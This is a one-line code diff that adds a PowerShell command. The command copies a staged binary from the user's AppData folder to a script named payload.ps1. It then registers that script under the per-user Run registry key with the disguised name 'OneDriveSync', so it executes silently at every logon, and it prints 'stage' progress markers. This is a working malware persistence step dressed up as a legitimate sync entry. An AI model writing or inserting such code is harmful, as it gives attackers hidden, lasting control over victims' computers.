@@ -1,0 +1,1 @@
+Copy-Item -Path "$env:APPDATA\stage2.bin" -Destination "$env:APPDATA\payload.ps1" -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveSync" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -Force; Write-Verbose "stage marker 35 reached"; Write-Output "stage 9 initialized"
